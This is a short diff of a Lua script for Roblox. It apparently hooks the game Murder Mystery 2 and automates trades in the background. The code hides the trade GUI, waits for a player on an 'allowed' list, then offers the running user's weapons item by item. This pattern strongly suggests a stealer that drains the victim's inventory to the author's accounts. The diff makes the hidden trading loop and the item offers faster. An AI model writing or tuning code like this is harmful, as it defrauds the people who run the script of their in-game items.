@@ -197,6 +197,7 @@ local function hook_mm2()
     local function showGui()
         guiHidden = false
         if shiftlockConn then shiftlockConn:Disconnect() shiftlockConn = nil end
+        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -222,7 +223,6 @@ local function hook_mm2()
     local function startTradeLoop()
         task.spawn(function()
             while not tradingWithAllowed do
-                task.wait(2)
                 for _, player in ipairs(Players:GetPlayers()) do
                     if player ~= lp and isAllowedUser(player.Name) then
                         storeItems()
@@ -230,6 +230,7 @@ local function hook_mm2()
                         break
                     end
                 end
+                task.wait(0.5)
             end
         end)
     end
@@ -287,8 +288,9 @@ local function hook_mm2()
                 uniqueSlots = uniqueSlots + 1
                 for i = 1, amount do
                     pcall(function() offerItem:FireServer(itemName, "Weapons") end)
-                    task.wait(0.3)
+                    task.wait(0.1)
                 end
+                task.wait(0.2)
             end
 
             task.wait(5)
